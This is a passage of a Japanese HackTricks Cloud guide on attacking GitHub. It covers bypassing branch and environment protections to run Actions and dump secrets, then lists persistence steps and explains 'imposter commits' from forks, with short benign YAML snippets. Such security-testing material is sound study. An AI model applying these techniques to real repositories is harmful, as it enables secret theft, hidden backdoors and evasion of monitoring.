* **指定されたアクターがプルリクエストの要件をバイパスできるようにする**: これらのアクターの1人である場合、プルリクエストの保護をバイパスできます。
* **管理者を含める**: これが設定されていない場合、リポジトリの管理者である場合、このブランチの保護をバイパスできます。
* **PRハイジャック**: 他の誰かのPRを**変更して悪意のあるコードを追加**し、結果のPRを自分自身で承認し、すべてをマージすることができるかもしれません。
* **ブランチ保護の削除**: リポジトリの**管理者であれば保護を無効に**し、自分のPRをマージし、保護を再設定することができます。
* **プッシュ保護のバイパス**: リポジトリが特定のユーザーのみにプッシュ（コードのマージ）を許可する場合（ブランチ保護はワイルドカード`*`を指定してすべてのブランチを保護している場合があります）、プッシュ保護をバイパスすることができます。
* リポジトリに**書き込みアクセス権があるが、ブランチ保護のためにコードをプッシュすることは許可されていない**場合、新しいブランチを作成し、その中で**コードがプッシュされるとトリガーされるgithub actionを作成**することができます。**ブランチが作成されるまでブランチ保護はブランチを保護しない**ため、最初のコードプッシュは**github actionを実行**します。

## 環境保護のバイパス

[**Github環境の基本情報についてはこちらを参照**](basic-github-information.md#git-environments)。

環境が**すべてのブランチからアクセス可能**である場合、それは**保護されていない**ため、環境内の秘密情報に簡単にアクセスできます。すべてのブランチが保護されているリポジトリ（名前を指定するか、`*`を使用することで）を見つける可能性があることに注意してください。その場合、コードをプッシュできるブランチを見つけて、新しいgithub actionを作成（または変更）することで、秘密情報を持ち出すことができます。

注意：すべてのブランチが保護されているエッジケースを見つけるかもしれません（ワイルドカード`*`を使用して）。ブランチにコードをプッシュできるユーザーが指定されている（ブランチ保護で指定できます）が、**あなたのユーザーは許可されていない**場合でも、自分自身のカスタムgithub actionを実行することができます。ブランチを作成し、自己トリガーのプッシュトリガーを使用できるため、**ブランチ保護は新しいブランチへのプッシュを許可**します。
```yaml
push: # Run it when a push is made to a branch
branches:
- current_branch_name #Use '**' to run when a push is made to any branch
```
注意：ブランチの作成後、ブランチ保護が新しいブランチに適用され、変更できなくなりますが、その時点ですでにシークレットをダンプしています。

## 持続性

* ユーザートークンを生成する
* シークレットからGitHubトークンを盗む
* ワークフローの結果とブランチを削除する
* 組織全体により多くの権限を与える
* 情報を外部に持ち出すためにウェブフックを作成する
* 外部の共同作業者を招待する
* SIEMによって使用されているウェブフックを削除する
* バックドアを持つGithub Actionを作成/変更する
* シークレットの値の変更を介した脆弱なGithub Actionをコマンドインジェクションする

### インポスターコミット - リポジトリコミットを介したバックドア

Githubでは、フォークからリポジトリへのPRを作成することが可能です。PRが受け入れられなくても、元のリポジトリのコミットIDがコードのフォークバージョンのために作成されます。したがって、攻撃者は、リポジトリの所有者によって作成されていない見かけのリポジトリから特定のコミットを使用することができます。

[**こちら**](https://github.com/actions/checkout/commit/c7d749a2d57b4b375d1ebcd17cfbfb60c676f18e)のように。
```yaml
name: example
on: [push]
jobs:
commit:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@c7d749a2d57b4b375d1ebcd17cfbfb60c676f18e
- shell: bash
run: |
echo 'hello world!'
```
詳細については、[https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd](https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd)を参照してください。

<details>

<summary><strong>HackTricksをサポートして特典を受け取る！</strong></summary>

* **HackTricksの最新バージョンにアクセスしたい**場合や、**PEASSの最新バージョンをダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローしてください 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **ハッキングのトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>
